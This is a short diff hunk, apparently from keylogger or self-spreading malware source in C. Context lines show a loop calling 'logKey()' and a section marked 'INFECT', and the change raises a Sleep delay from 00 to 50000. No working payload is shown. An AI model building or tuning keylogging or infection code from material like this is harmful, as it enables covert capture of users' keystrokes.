@@ -83,7 +83,7 @@ main(){
         if(age <= LIFE_TIME){
             logKey();
         }else{
-            Sleep(00);
+            Sleep(50000);
         }
 
         ////////////****INFECT****////////////
